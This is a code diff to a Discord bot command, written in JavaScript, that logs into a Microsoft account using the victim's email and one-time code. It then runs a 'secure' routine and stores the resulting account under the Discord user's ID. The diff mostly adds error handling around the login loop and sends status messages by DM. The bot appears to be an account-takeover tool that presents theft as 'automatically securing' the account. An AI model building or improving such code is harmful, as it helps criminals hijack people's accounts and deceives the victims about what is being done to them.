@@ -77,60 +77,61 @@ module.exports = {
         console.log(`[OTP_SECURE] Attempting login with OTP...`);
         for (let sec of profiles?.Credentials?.OtcLoginEligibleProofs) {
             console.log(`[OTP_SECURE] Trying OTP proof with ID: ${sec.data}`);
-            let host = await login({ email: email, id: sec.data, code: otp }, profiles);
-            if (host) {
-                console.log(`[OTP_SECURE] Login successful, host obtained`);
-                const expireTimestamp = Math.floor((Date.now() / 1000) + 900);
-                let uid = await generateuid();
+            try {
+                let host = await login({ email: email, id: sec.data, code: otp }, profiles);
+                if (host) {
+                    console.log(`[OTP_SECURE] Login successful, host obtained`);
+                    const expireTimestamp = Math.floor((Date.now() / 1000) + 900);
+                    let uid = await generateuid();
 
-                const embed = {
-                    title: 'This account is being automatically secured.',
-                    color: 0x808080
-                };
-                
-                const components = [
-                    new ActionRowBuilder().addComponents(
-                        new ButtonBuilder()
-                            .setCustomId(`status|${uid}`)
-                            .setLabel('⏳ Status')
-                            .setStyle(ButtonStyle.Primary)
-                    )
-                ];
-                
-                await interaction.editReply({ embeds: [embed], components });
-                
+                    const embed = {
+                        title: 'This account is being automatically secured.',
+                        color: 0x808080
+                    };
+                    
+                    const components = [
+                        new ActionRowBuilder().addComponents(
+                            new ButtonBuilder()
+                                .setCustomId(`status|${uid}`)
+                                .setLabel('⏳ Status')
+                                .setStyle(ButtonStyle.Primary)
+                        )
+                    ];
+                    
+                    await interaction.editReply({ embeds: [embed], components });
+                    
+                    await interaction.user.send({ embeds: [embed], components });
+                    
+                    try {
+                        console.log(`uid: ${uid}`);
+                        let acc = await secure(host, settings, uid, mcign);
+                      
+                        let inserted = await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);
 
-                await interaction.user.send({ embeds: [embed], components });
-                
-                try {
-                    console.log(`uid: ${uid}`);
-                    let acc = await secure(host, settings, uid, mcign);
-                  
-                    let inserted = await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);
+                        const failedmsg = await failedembed(acc, uid)
+                        if (failedmsg.failed) {
+                            await interaction.followUp(failedmsg.failedmsg);
+                            await interaction.user.send(failedmsg.failedmsg);
+                            return;
+                        }
 
-
-                    const failedmsg = await failedembed(acc, uid)
-                    if (failedmsg.failed) {
-                        await interaction.followUp(failedmsg.failedmsg);
-                        await interaction.user.send(failedmsg.failedmsg);
-                        return;
+                        let accountmessage = await listAccount(acc, uid, client, interaction);
+                        await interaction.user.send(accountmessage).catch(() => {});
+                        await interaction.editReply(accountmessage).catch(() => {});
+                    } catch (error) {
+                        console.log(error);
+                        await interaction.editReply({
+                            embeds: [{
+                                title: `Failed securing!`,
+                                description: `An error occurred while securing your account.\n Please use the status button to log in to your account.`,
+                                color: 0xff0000
+                            }],
+                        }).catch(() => {});
                     }
-
-
-                    let accountmessage = await listAccount(acc, uid, client, interaction);
-                    await interaction.user.send(accountmessage).catch(() => {});
-                    await interaction.editReply(accountmessage).catch(() => {});
-                } catch (error) {
-                    console.log(error);
-                    await interaction.editReply({
-                        embeds: [{
-                            title: `Failed securing!`,
-                            description: `An error occurred while securing your account.\n Please use the status button to log in to your account.`,
-                            color: 0xff0000
-                        }],
-                    }).catch(() => {});
+                    return;
                 }
-                return;
+            } catch (loginError) {
+                console.error(`[OTP_SECURE] Error during login for proof ID ${sec.data}:`, loginError);
             }
         }
 
